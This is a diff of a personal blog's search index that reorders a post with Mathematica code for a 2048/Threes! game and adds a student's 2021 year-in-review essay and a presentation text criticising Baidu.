@@ -1,28 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2048的又一次改良</title>
-    <url>/2021/08/02/2048plus.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>闲来无事，我扒出了十年前在网上复制粘贴的mma2048代码，并对其进行了改良，将2048与Threes!结合起来，形成了如下代码。</p>
-<span id="more"></span>
-<p>（由于涉及键盘操作，网页版的编译器无法操作，请自行下载mma8.0及以上版本运行）</p>
-<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">挪<span class="punctuation">[</span>左<span class="punctuation">]</span> <span class="operator">=</span> <span class="type">#</span> <span class="operator">//.</span> <span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="variable">a</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> </span><br><span class="line">        <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="number">2</span> 抓住<span class="punctuation">[</span><span class="variable">a</span><span class="punctuation">]</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="operator">/.</span> 抓住<span class="punctuation">[</span><span class="type">a_</span><span class="punctuation">]</span> <span class="operator">:&gt;</span> <span class="variable">a</span> <span class="operator">&amp;;</span></span><br><span class="line">挪<span class="punctuation">[</span>上<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>下<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Reverse</span><span class="operator">,</span> 挪<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Reverse</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>右<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">加块瓦 <span class="operator">=</span> <span class="built_in">ReplacePart</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="built_in">RandomChoice</span><span class="operator">@</span><span class="built_in">Position</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="number">1</span><span class="punctuation">]</span> <span class="operator">-&gt;</span> <span class="built_in">RandomChoice</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="number">2</span><span class="operator">,</span> <span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">按键 <span class="operator">=</span> <span class="built_in">If</span><span class="punctuation">[</span>格子 <span class="operator">!=</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="operator">,</span> 格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span>挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span> 总分 <span class="operator">=</span> <span class="built_in">Total</span><span class="punctuation">[</span><span class="built_in">Total</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">    <span class="built_in">Which</span><span class="punctuation">[</span><span class="built_in">And</span> <span class="operator">@@</span> <span class="punctuation">(</span>格子 <span class="operator">==</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span> <span class="operator">&amp;</span> <span class="operator">/@</span> <span class="punctuation">&#123;</span>左<span class="operator">,</span> 右<span class="operator">,</span> 上<span class="operator">,</span> 下<span class="punctuation">&#125;</span><span class="punctuation">)</span><span class="operator">,</span> </span><br><span class="line">     状态 <span class="operator">=</span> <span class="string">&quot;你的得分为&quot;</span> <span class="built_in">ToString</span><span class="punctuation">[</span>总分<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span><span class="built_in">ConstantArray</span><span class="punctuation">[</span><span class="number">1</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">5</span><span class="operator">,</span> <span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">状态 <span class="operator">=</span> <span class="string">&quot;&quot;</span><span class="operator">;</span></span><br><span class="line"><span class="built_in">EventHandler</span><span class="punctuation">[</span></span><br><span class="line"> <span class="built_in">Dynamic</span><span class="punctuation">[</span><span class="built_in">ArrayPlot</span><span class="punctuation">[</span><span class="built_in">Log2</span><span class="operator">@</span>格子<span class="operator">/</span><span class="number">17</span><span class="operator">,</span> <span class="built_in">ColorFunction</span> <span class="operator">-&gt;</span> <span class="built_in">Hue</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">ColorFunctionScaling</span> <span class="operator">-&gt;</span> <span class="built_in">False</span><span class="operator">,</span> <span class="built_in">Mesh</span> <span class="operator">-&gt;</span> <span class="built_in">All</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">Epilog</span> <span class="operator">-&gt;</span> <span class="punctuation">&#123;</span><span class="built_in">MapIndexed</span><span class="punctuation">[</span></span><br><span class="line">      <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">If</span><span class="punctuation">[</span><span class="type">#1</span> <span class="operator">==</span> <span class="number">1</span><span class="operator">,</span> <span class="string">&quot;&quot;</span><span class="operator">,</span> <span class="built_in">Style</span><span class="punctuation">[</span><span class="type">#1</span><span class="operator">,</span> <span class="string">&quot;Section&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="type">#2</span> <span class="operator">-</span> <span class="punctuation">&#123;</span><span class="number">0.5</span><span class="operator">,</span> <span class="number">0.5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="operator">&amp;,</span> </span><br><span class="line">      <span class="built_in">Transpose</span><span class="operator">@</span><span class="built_in">Reverse</span><span class="operator">@</span>格子<span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">     <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">Style</span><span class="punctuation">[</span>状态<span class="operator">,</span> <span class="built_in">Blue</span><span class="operator">,</span> <span class="number">24</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2.5</span><span class="operator">,</span> <span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="string">&quot;LeftArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> </span><br><span class="line">   按键<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;RightArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>右<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;UpArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">  <span class="string">&quot;DownArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
-<p>计分方式就是所有数字的和，不是2048合成就加分的方式，因此得分会缩水50%左右。</p>
-<p>感觉这个版本的难度增加了不少，目前最高分621，我太菜了，有能力的可以在评论区晒分截图。</p>
-<head>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
-  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
-  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
-</head>
-]]></content>
-      <categories>
-        <category>develop</category>
-      </categories>
-      <tags>
-        <tag>mma</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>二一——再见，鼠标</title>
     <url>/2021/10/24/1024.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>为了提高工作效率，以及出于对手腕健康的考虑（现在已经有一定程度的肿胀磨损）。在这个<strong>特殊的日子</strong>，我鼠标的最后一点电耗尽之际，我决心抛弃鼠标，将<strong>几乎</strong>所有的操作全部转移到键盘上。</p>
@@ -128,6 +106,28 @@
       <categories>
         <category>随笔</category>
       </categories>
+  </entry>
+  <entry>
+    <title>2048的又一次改良</title>
+    <url>/2021/08/02/2048plus.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>闲来无事，我扒出了十年前在网上复制粘贴的mma2048代码，并对其进行了改良，将2048与Threes!结合起来，形成了如下代码。</p>
+<span id="more"></span>
+<p>（由于涉及键盘操作，网页版的编译器无法操作，请自行下载mma8.0及以上版本运行）</p>
+<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">挪<span class="punctuation">[</span>左<span class="punctuation">]</span> <span class="operator">=</span> <span class="type">#</span> <span class="operator">//.</span> <span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="variable">a</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="type">x___</span><span class="operator">,</span> </span><br><span class="line">        <span class="type">a_</span> <span class="operator">/;</span> <span class="variable">a</span> <span class="operator">&gt;</span> <span class="number">1</span><span class="operator">,</span> <span class="type">a_</span><span class="operator">,</span> <span class="type">y___</span><span class="punctuation">&#125;</span> <span class="operator">:&gt;</span> <span class="punctuation">&#123;</span><span class="variable">x</span><span class="operator">,</span> <span class="number">2</span> 抓住<span class="punctuation">[</span><span class="variable">a</span><span class="punctuation">]</span><span class="operator">,</span> <span class="number">1</span><span class="operator">,</span> <span class="variable">y</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="operator">/.</span> 抓住<span class="punctuation">[</span><span class="type">a_</span><span class="punctuation">]</span> <span class="operator">:&gt;</span> <span class="variable">a</span> <span class="operator">&amp;;</span></span><br><span class="line">挪<span class="punctuation">[</span>上<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>下<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Reverse</span><span class="operator">,</span> 挪<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Reverse</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">挪<span class="punctuation">[</span>右<span class="punctuation">]</span> <span class="operator">=</span> <span class="built_in">Composition</span><span class="punctuation">[</span><span class="built_in">Transpose</span><span class="operator">,</span> 挪<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="operator">,</span> <span class="built_in">Transpose</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">加块瓦 <span class="operator">=</span> <span class="built_in">ReplacePart</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="built_in">RandomChoice</span><span class="operator">@</span><span class="built_in">Position</span><span class="punctuation">[</span><span class="type">#</span><span class="operator">,</span> <span class="number">1</span><span class="punctuation">]</span> <span class="operator">-&gt;</span> <span class="built_in">RandomChoice</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="number">2</span><span class="operator">,</span> <span class="number">3</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">按键 <span class="operator">=</span> <span class="built_in">If</span><span class="punctuation">[</span>格子 <span class="operator">!=</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="operator">,</span> 格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span>挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span> 总分 <span class="operator">=</span> <span class="built_in">Total</span><span class="punctuation">[</span><span class="built_in">Total</span><span class="punctuation">[</span>格子<span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">    <span class="built_in">Which</span><span class="punctuation">[</span><span class="built_in">And</span> <span class="operator">@@</span> <span class="punctuation">(</span>格子 <span class="operator">==</span> 挪<span class="punctuation">[</span><span class="type">#</span><span class="punctuation">]</span><span class="punctuation">[</span>格子<span class="punctuation">]</span> <span class="operator">&amp;</span> <span class="operator">/@</span> <span class="punctuation">&#123;</span>左<span class="operator">,</span> 右<span class="operator">,</span> 上<span class="operator">,</span> 下<span class="punctuation">&#125;</span><span class="punctuation">)</span><span class="operator">,</span> </span><br><span class="line">     状态 <span class="operator">=</span> <span class="string">&quot;你的得分为&quot;</span> <span class="built_in">ToString</span><span class="punctuation">[</span>总分<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">]</span> <span class="operator">&amp;;</span></span><br><span class="line">格子 <span class="operator">=</span> 加块瓦<span class="punctuation">[</span><span class="built_in">ConstantArray</span><span class="punctuation">[</span><span class="number">1</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">5</span><span class="operator">,</span> <span class="number">5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">;</span></span><br><span class="line">状态 <span class="operator">=</span> <span class="string">&quot;&quot;</span><span class="operator">;</span></span><br><span class="line"><span class="built_in">EventHandler</span><span class="punctuation">[</span></span><br><span class="line"> <span class="built_in">Dynamic</span><span class="punctuation">[</span><span class="built_in">ArrayPlot</span><span class="punctuation">[</span><span class="built_in">Log2</span><span class="operator">@</span>格子<span class="operator">/</span><span class="number">17</span><span class="operator">,</span> <span class="built_in">ColorFunction</span> <span class="operator">-&gt;</span> <span class="built_in">Hue</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">ColorFunctionScaling</span> <span class="operator">-&gt;</span> <span class="built_in">False</span><span class="operator">,</span> <span class="built_in">Mesh</span> <span class="operator">-&gt;</span> <span class="built_in">All</span><span class="operator">,</span> </span><br><span class="line">   <span class="built_in">Epilog</span> <span class="operator">-&gt;</span> <span class="punctuation">&#123;</span><span class="built_in">MapIndexed</span><span class="punctuation">[</span></span><br><span class="line">      <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">If</span><span class="punctuation">[</span><span class="type">#1</span> <span class="operator">==</span> <span class="number">1</span><span class="operator">,</span> <span class="string">&quot;&quot;</span><span class="operator">,</span> <span class="built_in">Style</span><span class="punctuation">[</span><span class="type">#1</span><span class="operator">,</span> <span class="string">&quot;Section&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="type">#2</span> <span class="operator">-</span> <span class="punctuation">&#123;</span><span class="number">0.5</span><span class="operator">,</span> <span class="number">0.5</span><span class="punctuation">&#125;</span><span class="punctuation">]</span> <span class="operator">&amp;,</span> </span><br><span class="line">      <span class="built_in">Transpose</span><span class="operator">@</span><span class="built_in">Reverse</span><span class="operator">@</span>格子<span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">     <span class="built_in">Text</span><span class="punctuation">[</span><span class="built_in">Style</span><span class="punctuation">[</span>状态<span class="operator">,</span> <span class="built_in">Blue</span><span class="operator">,</span> <span class="number">24</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="number">2.5</span><span class="operator">,</span> <span class="number">2</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="operator">,</span> <span class="punctuation">&#123;</span><span class="string">&quot;LeftArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> </span><br><span class="line">   按键<span class="punctuation">[</span>左<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;RightArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>右<span class="punctuation">]</span><span class="operator">,</span> <span class="string">&quot;UpArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>上<span class="punctuation">]</span><span class="operator">,</span> </span><br><span class="line">  <span class="string">&quot;DownArrowKeyDown&quot;</span> <span class="operator">:&gt;</span> 按键<span class="punctuation">[</span>下<span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+<p>计分方式就是所有数字的和，不是2048合成就加分的方式，因此得分会缩水50%左右。</p>
+<p>感觉这个版本的难度增加了不少，目前最高分621，我太菜了，有能力的可以在评论区晒分截图。</p>
+<head>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
+</head>
+]]></content>
+      <categories>
+        <category>develop</category>
+      </categories>
+      <tags>
+        <tag>mma</tag>
+      </tags>
   </entry>
   <entry>
     <title>博客一周年祭</title>
@@ -320,6 +320,73 @@
 <p>So please cherish the last year of your senior high. It’s truly the purest time of your whole life.</p>
 <p><strong>Another thing is the distance between my dream and the reality.</strong> I’m very suitable for my current profession because I’m skilled in math, English and programming. Also, I’m satisfied with my current place and my family are proud of me. However, the path to my dream becomes more and more blurred and my avarice for money (I believe a high salary is waiting for me) prevents me from achieving it. Maybe in the rest of my life I could only daydream it, which makes me feel gloomy with a bit of melancholy.</p>
 <p>Lastly, I sincerely congratulate her and hope her could achieve the dream. After all, unlike olympiad which tests agility and cleverness, learning serious math requires very tough work, at least 10 times harder than my profession. I also hope myself could get out of the woods and reach a new altitude. At that time, maybe I will find the way to my dream again.</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Twenty-four——my summary of year 2021</title>
+    <url>/2021/12/30/bye2021.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>The year 2021 is another extraordinary year for me. Many shining and gloomy moments happened. To sum up, I still believe my year of 2021 goes smoothly.</p>
+<p><img src="/2021/12/30/bye2021/2021.png"></p>
+<span id="more"></span> 
+<p>The year of 2021 started with disappointment of AFO and frustration of failing in the monthly examination. I knew this was a crux of my life because there were only 5 months left before gaokao but I still had a bunch of things to master. My goal was to reach 600, and I had to prepare for OI, CTF for self-enrollment exam, attend classes and review those unfamiliar knowledge before simultaneously. It’s a very tough work, like walking in the darkness while looking for the correct path myself. The only joyful thing in my “senior 3” was playing table-tennis and taking photos in snowy days after the academic proficiency test ended.</p>
+<p>In winter vacation, to help go through courses I’ve learnt and forgotten in senior 1, I asked my parents to find “one to one” tutoring for my physics and chemistry. Surely I recovered what I learned before and I’ve got a lot of practical skills for exam, but more importantly, my physics tutor told me the prospect of computer science and asked me to work hard on it. I was motivated by him and put more attention to self-enrollment.</p>
+<p>By the end of March, my hard work in CTF has paid off and I succeeded in self-enrollment exam by scu. It’s the first and huge progress I’ve made this year. After the exam, my task became much simpler. I just need to focus on gaokao and got a high score instead.</p>
+<p>Time passed quickly and gaokao finally arrived in a glimpse. Although the difficulty of natural science has raised, I still got a fairly high score in math. However, I messed up in physics and chemistry, which made the overall score just a little more than 600. There were some classmates attending gaokao <strong>in senior 2 with me</strong> and the best score was about 670, but I don’t care. All in all, 605 is still a highlight for student who only takes classes for about one year. </p>
+<blockquote>
+<p>After gaokao, my mother told me that she was diagnosed with lung cancer when I was having a self-enrollment. But luckily, it was an early stage and can be cured by an operation. Also, she had an insurance and got paid a lot of money, which was far more than the fare of operation. Say, this was the unexpected fortune. What depressed my family was she indulged in <del>investment</del> lottery and took no notice of my advice of quitting. When she realized this was a fraud, she had lost all of the “unexpected fortune”.</p>
+</blockquote>
+<p>The life in summer vacation wasn’t as easy as I thought before. I had to learn calculus, linear algebra and got a driving license in only 2 months. I couldn’t imagine how I managed to handle these but I still worked them out. Also, I played <em>Mystery Lover</em> recommended by Hash and developed an interest in Touhou (although I don’t plan to play the game because it’s too time-consuming), yandere (like Yuno) and music games. These games, anime and music took me into another idealized world apart from the cruel reality. Say, another habitat for my heart.</p>
+<p>By the time I entered university, I firstly felt all the surroundings are fresh and we have plenty of time to what I want. Then I realized that self-control is impressively significant in campus life now, which can make you distinctive or degenerate. So I continued to learn with the strength of senior high. Then in a CTF competition nationwide, we ranked 4th in 24 participants, winning the glory of our university <del>and high school</del>.</p>
+<p>However in the mid-term exam, I didn’t do a very good job in calculus, just a little more than 60 again. Also, the freshness of campus life has vanished, I gradually found that there are many unnecessary tasks you have to do and boresome courses you have to take. That made me kind of annoyed. Sometimes I even doubted if the path I chose is my dream and lost in thought. </p>
+<blockquote>
+<p>To seek the meaning of my campus life and look for way to achieve my dream, I watched <em>CLANNAD</em> and also played the game. Although I didn’t find the answer to my current situation, I truly felt a different kind of warmth. I was moved by the grand redefinition of “FAMILY” and the growth and maturity of Okazaki couple. Till now, the plots and scenarios still reverberate in my heart.</p>
+</blockquote>
+<p>When the security project comes in late November and December, some classmates asked me questions about pointers, stack overflow and reverse engineering. So, I posted some blogs, trying to explain these knowledge in a friendly way. While teaching others, I also have a deeper understanding of these principle by manipulating over and over again. And step by step I’ve felt the charm of my major and I’m not as bewildered as before. So I’m starting to learn <em>CSAPP</em> and <em>encryption and decryption</em> on my own during spare time to enrich my academic ability.</p>
+<p>Hoping I will get good grades in calculus and linear algebra, and learn more practical skills in the next year 2022!  </p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>twenty-five——bye, Baidu</title>
+    <url>/2022/04/15/bye_baidu.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>My English presentation on 4/14/2022.</p>
+<p><img src="/2022/04/15/bye_baidu/1.png"></p>
+<span id="more"></span>
+<p><img src="/2022/04/15/bye_baidu/2.png"></p>
+<p>Baidu, the largest search engine provider in China, was found in millennium. Owing to deep understanding of habits from native users, Baidu beat its opponent Google successfully. What’s more, deeply integrated with other services, such as Baidu Encyclopedia, Baidu Post Bar, Baidu Knows, Baidu Netdisk, Baidu improved user stickiness. In recent years, with the development of mobile-tech, Baidu created a column named Baijiahao. Through using mobile apps, Baidu gains a lot of user traffic, while making much profit.</p>
+<p><img src="/2022/04/15/bye_baidu/3.png"></p>
+<p><img src="/2022/04/15/bye_baidu/4.png"></p>
+<p>The first reason to refuse Baidu is that there are too much distraction. One of the most obvious factors is the advertisement. Look at this picture, when you input keywords relating to “diseases”, “education” or goods”, Baidu will return a whole page of noisome ads, which wastes your time. Moreover, some fake ads may mislead you and cause some loss.</p>
+<p><img src="/2022/04/15/bye_baidu/5.png"></p>
+<p>Apart from disgusting ads, the search result pages of Baidu are too complex. There are too many unnecessary items. For example, when you type “games” in Baidu, the recommendation on the right is so vulgar that they can’t even be called as “games”.</p>
+<p><img src="/2022/04/15/bye_baidu/6.png"></p>
+<p>The profusion of webpage is also the nightmare of minimalists. This is a new tab from my browser. Looks very simple, huh?</p>
+<p><img src="/2022/04/15/bye_baidu/7.png"></p>
+<p>This is Google. It’s also very suitable for minimalists.</p>
+<p><img src="/2022/04/15/bye_baidu/8.png"></p>
+<p>This is Bing. It looks beautiful and even better.</p>
+<p><img src="/2022/04/15/bye_baidu/9.png"></p>
+<p>And this is Baidu… Most of the time, if you click one of these links, you’ll watch videos or read news one after another——and after half or one hour later, you will return to the start and totally forget what you want to search in the beginning.</p>
+<p><img src="/2022/04/15/bye_baidu/10.png"></p>
+<p>The second reason is useless search result for some keywords. Baidu only takes root in the Chinese market, so it’s unsuitable to search items that are heavily associated with English. </p>
+<p><img src="/2022/04/15/bye_baidu/11.png"></p>
+<p>In professional fields, like mathematics, when you type “de rham cohomology”, you can get a link to Wikipedia. However in Baidu, the first search result is just the Chinese translation. I believe people who search this are eager to find its definition and explanation, not just the Chinese translation.</p>
+<p><img src="/2022/04/15/bye_baidu/12.png"></p>
+<p><img src="/2022/04/15/bye_baidu/13.png"></p>
+<p>My roommate is a sports fan and he often follows sports stars’ activities. Baidu lacks information of foreign culture like sports. When he tried to look up “juju” in Google, it returns his Instagram, wiki and so on. On the other side, he typed the same word in Baidu, he can only receive a female Japanese singer and other unrelated info.</p>
+<p><img src="/2022/04/15/bye_baidu/14.png"></p>
+<p><img src="/2022/04/15/bye_baidu/15.png"></p>
+<p>Another reason not to be ignored is its vile business model. If you use your mobile browser to search in Baidu.com, or click other related searches, you’ll receive a pop-up which asks to download their app. This action degrades the user experience and makes some mobile users reluctantly install Baidu app——of course not including me.</p>
+<p>Another solid proof is the speed restriction policy of Baidu Netdisk. At the beginning when Baidu Netdisk was found, it generously gives users 2048 gigabytes of disk space. Actually this is a good scheme to accumulate users. When there are enough (i.e. pretty much) users, Baidu starts to restrict the download speed and asks users to upgrade VIP in order to speed up. Because users have already store lots of data, they can’t find any substitute. As a result, they have to pay for Baidu to retrieve their important data.</p>
+<p><img src="/2022/04/15/bye_baidu/16.png"></p>
+<p>It must be said that Baidu still has some advantages. Due to the lack of copyright awareness in Mainland China, you can still find lots of pirated software in Baidu. By the way, it’s also a good choice to look for pornography in Baidu.</p>
+<p>All in all, as college students, to save time and find more refined information, let’s say “goodbye” to Baidu and user other search engines together. Thanks for your listening!</p>
+<p><img src="/2022/04/15/bye_baidu/17.png"></p>
 ]]></content>
       <categories>
         <category>随笔</category>
@@ -523,73 +590,6 @@
       </tags>
   </entry>
   <entry>
